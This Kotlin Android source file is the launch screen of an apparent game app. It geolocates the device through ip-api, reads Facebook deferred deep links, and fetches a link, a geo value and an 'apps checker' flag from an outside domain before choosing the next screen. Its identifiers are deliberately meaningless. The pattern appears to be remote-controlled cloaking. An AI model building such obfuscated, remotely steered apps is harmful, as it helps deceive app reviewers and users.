package com.skgames.tra

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.skgames.tra.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.skgames.tra.DataClassMain.Companion.countryCodefrrfrfrfrrf
import com.skgames.tra.DataClassMain.Companion.geomeogtgt


class MainActivity : AppCompatActivity() {
    private lateinit var qqqqq: ActivityMainBinding

    private suspend fun vcvcvcvc() {
        val xcxxccxxc = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(SsssserviceApi::class.java)
        val frfrrfr = xcxxccxxc.getData().body()?.countryCodefgtgt56556

        Hawk.put(countryCodefrrfrfrfrrf, frfrrfr)
    }

    fun bbbbb(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val bgbggbg = appLinkData.targetUri.host.toString()
                Hawk.put(DataClassMain.DEEPLfrfrfrfr, bgbggbg)
            }
            if (appLinkData == null) {
            }
        }
    }

    private suspend fun hyhy() {

        val bnbnbn = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://transcendingforest.xyz/")
            .build()
            .create(SsssserviceApi::class.java)
        val jkjkjk = bnbnbn.getDataDev().body()?.gyhyhyfrfr.toString()
        val ggggg5 = bnbnbn.getDataDev().body()?.appsCheckergtgttgtgt556.toString()
        val ddddd6 = bnbnbn.getDataDev().body()?.geofgtt55.toString()




        Hawk.put(DataClassMain.linkfrrrfrffr, jkjkjk)
        Hawk.put(DataClassMain.appsCheckfrr6, ggggg5)
        Hawk.put(DataClassMain.geomeogtgt, ddddd6)

    }


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        qqqqq = ActivityMainBinding.inflate(layoutInflater)
        setContentView(qqqqq.root)

        bbbbb(this)

        val uiiuuui = Executors.newSingleThreadScheduledExecutor()
        var ffgtgttoooo: String? = Hawk.get(countryCodefrrfrfrfrrf, null)
        var lololo: String? = Hawk.get(geomeogtgt, null)
        uiiuuui.scheduleAtFixedRate({
            if (ffgtgttoooo != null && lololo != null) {
                uiiuuui.shutdown()
                mkmkkmmk()
            } else {
                ffgtgttoooo = Hawk.get(countryCodefrrfrfrfrrf)
                lololo = Hawk.get(geomeogtgt)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            njnjjnj
        }
    }


    private val njnjjnj: Job = GlobalScope.launch(Dispatchers.IO) {
        vcvcvcvc()
        hyhy()
    }

    private fun mkmkkmmk() {
        val bbbbbbb = Intent(this@MainActivity, SimpleFilterActivity::class.java)
        startActivity(bbbbbbb)
        finish()
    }


}